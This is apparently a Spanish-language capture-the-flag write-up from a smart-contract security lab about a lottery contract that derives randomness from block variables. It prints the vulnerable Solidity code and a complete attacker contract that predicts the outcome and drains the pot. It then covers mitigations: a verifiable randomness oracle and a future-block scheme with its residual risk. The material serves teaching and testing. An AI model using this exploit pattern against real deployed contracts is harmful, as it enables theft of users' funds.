# C5. Aleatoriedad débil: writeup

Este documento explica cómo resolver el reto del caso C5. El análisis completo está en la sección 4.5 de la memoria.

## El reto: La Lotería Predecible

En Polonio el reto se llama `LoteriaPredecible`. En el laboratorio, el contrato equivalente es `LoteriaVulnerable` (`src/C5-aleatoriedad/Vulnerable.sol`).

**Escenario.** Una lotería tiene un bote de 5 ETH. Cada jugada cuesta 1 ETH y, si el número "aleatorio" que calcula el contrato es par, el jugador se lleva todo el bote.

**Objetivo.** Vaciar el bote sin arriesgarse a perder. El reto se da por resuelto cuando `isSolved()` devuelve `true`, es decir, cuando el saldo de la lotería es 0.

## La vulnerabilidad

```solidity
function jugar() external payable {
    require(msg.value == 1 ether, "1 ETH");

    // FALLO: azar predecible a partir de variables del bloque.
    uint256 aleatorio = uint256(
        keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))
    );

    if (aleatorio % 2 == 0) {
        payable(msg.sender).transfer(address(this).balance); // premio
    }
}
```

La EVM es determinista: todos los nodos tienen que obtener el mismo resultado, así que no existe una fuente de azar real dentro de un contrato. Las tres entradas de la fórmula no son secretas:

- `block.timestamp` y `block.prevrandao` son las mismas para cualquier contrato que se ejecute en el mismo bloque.
- `msg.sender` es la dirección de quien juega, que el atacante conoce.

Además, la apuesta y el resultado se resuelven en la misma transacción. Un contrato puede calcular el resultado antes de jugar y no jugar si va a perder.

## Resolución paso a paso

1. **Escribir un contrato que replique la fórmula.** La clave es usar `address(this)`, porque para la lotería `msg.sender` será el propio contrato atacante:

   ```solidity
   interface ILoteria {
       function jugar() external payable;
   }

   contract Atacante {
       ILoteria public loteria;

       constructor(address _loteria) payable {
           loteria = ILoteria(_loteria);
       }

       function vaAGanar() public view returns (bool) {
           uint256 aleatorio = uint256(
               keccak256(abi.encodePacked(block.timestamp, block.prevrandao, address(this)))
           );
           return aleatorio % 2 == 0;
       }

       function atacar() external {
           require(vaAGanar(), "esta ronda no toca");
           loteria.jugar{value: 1 ether}();
       }

       // Para recibir el bote.
       receive() external payable {}
   }
   ```

2. **Desplegarlo con 1 ETH**, que es lo que cuesta la jugada, pasando la dirección de la lotería.
3. **Llamar a `atacar()`.** Pueden pasar dos cosas:
   - Si la fórmula da un número impar, `atacar()` revierte antes de jugar. No pierdes la apuesta, solo el gas de la transacción.
   - Si da un número par, juega y la lotería le envía todo el bote.
4. **Repetir hasta que toque.** Cada intento entra en un bloque distinto, con otra marca de tiempo, así que el resultado cambia. En una red local con minado automático, deja pasar al menos un segundo entre intentos. En la prueba del laboratorio, la espera se modela avanzando el tiempo con `vm.warp`.
5. **Verificar.** La lotería queda a 0 y el contrato atacante tiene 6 ETH: el bote más su apuesta.

## Mitigación

La solución de referencia en producción es un oráculo de aleatoriedad verificable, como Chainlink VRF. El contrato pide un número en una transacción y lo recibe en otra posterior, generado fuera de la cadena junto con una prueba criptográfica que el propio contrato verifica.

En el laboratorio no hay oráculo, así que la versión corregida (`src/C5-aleatoriedad/Fixed.sol`) aplica la misma idea, separar la apuesta del resultado, con un esquema de **bloque futuro**:

1. `entrar()` fija el jugador y el bloque de la apuesta, y nunca paga en el acto.
2. `sortear()` exige que ese bloque ya esté cerrado y decide con su `blockhash`, un valor que no existía cuando se apostó. Si se intenta sortear en el mismo bloque, revierte con `espera al siguiente bloque`.
3. Si pasan más de 256 bloques, `blockhash` devuelve 0 y la ronda se cierra como perdida. No se devuelve la apuesta, porque eso daría al jugador una opción gratuita: si ve que pierde, le bastaría con esperar.

Una primera versión de esta corrección revertía cuando el `blockhash` había caducado, lo que dejaba la ronda ocupada y el bote bloqueado para siempre. La prueba `test_Fixed_BlockhashCaducado_NoBloquea` comprueba que eso ya no ocurre.

**Riesgo residual.** Quien propone el bloque conoce su hash antes de publicarlo y podría alterarlo cambiando el orden de las transacciones que incluye. Por eso el esquema de bloque futuro no se recomienda en producción y se prefiere VRF.

## Comprobarlo en el laboratorio

```bash
./forge test --match-contract C5_Aleatoriedad
./forge test --match-contract C5_Aleatoriedad --match-test test_Exploit_Vulnerable -vvvv
```

| Prueba | Qué comprueba |
|---|---|
| `test_Exploit_Vulnerable` | El atacante espera un bloque favorable, juega una vez y se lleva 6 ETH |
| `test_Fixed_Resiste` | Entrar no paga, sortear en el mismo bloque revierte y el bote sigue intacto |
| `test_Fixed_BlockhashCaducado_NoBloquea` | Tras 257 bloques la ronda se libera y otra persona puede jugar |
